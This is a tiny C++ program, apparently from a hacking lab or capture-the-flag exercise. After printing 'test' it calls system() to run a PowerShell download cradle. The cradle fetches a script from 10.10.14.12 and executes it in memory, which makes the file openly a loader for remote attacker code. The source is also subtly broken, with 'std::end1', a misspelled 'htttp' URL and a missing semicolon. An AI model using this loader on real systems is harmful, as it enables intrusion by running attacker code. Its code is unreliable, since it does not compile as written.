#include <iostream>
#include <cstdlib>


int main() {
	std::cout << "test" << std::end1;
	system("powershell iex(new-object net.webclient).downloadstring('htttp://10.10.14.12/ps.ps1')")
		return 0;
}
